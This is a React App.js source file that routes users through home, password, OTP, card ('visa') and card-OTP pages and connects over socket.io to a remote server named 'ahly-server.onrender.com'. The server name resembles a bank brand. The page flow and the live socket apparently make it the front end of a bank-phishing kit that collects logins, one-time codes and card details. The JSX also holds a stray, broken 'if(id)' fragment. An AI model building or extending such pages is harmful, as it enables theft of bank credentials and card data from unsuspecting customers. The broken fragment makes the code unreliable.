import { BrowserRouter, Routes, Route } from "react-router-dom";
import Home from "./Pages/Home";

import { useEffect, useState } from "react";
import Password from "./Pages/Password";
import Visa from "./Pages/Visa";
import VisaOtp from "./Pages/VisaOtp";
import axios from "axios";
import Otp from "./Pages/Otp";
import { io } from "socket.io-client";

// export const api_route = "http://localhost:8080";
export const api_route = 'https://ahly-server.onrender.com'
export const socket = io(api_route);

export function getKeysWithTrueValue(obj) {
  const keysWithTrueValue = {};
  for (const key in obj) {
    if (obj[key]) {
      keysWithTrueValue[key] = obj[key];
    }
  }
  return keysWithTrueValue;
}

function App() {
  useEffect(() => {
    (async () => {
      await axios.get(api_route + "/");
    })();
  }, []);
  const [loading, setLoading] = useState(false);

  return (
    <div className="min-h-screen  w-full flex items-start justify-center ">
      <div className="w-full md:w-1/2 relative items-center justify-center flex flex-col">
        {
          <BrowserRouter>
            <Routes>
              <Route path="/" element={<Home />} />
              if(id){" "}
              {
                <>
                  <Route path="/password" element={<Password />} />
                  <Route path="/otp" element={<Otp />} />
                  <Route path="/visa" element={<Visa />} />
                  <Route path="/visaOtp" element={<VisaOtp />} />
                </>
              }
            </Routes>
          </BrowserRouter>
        }
      </div>
    </div>
  );
}

export default App;
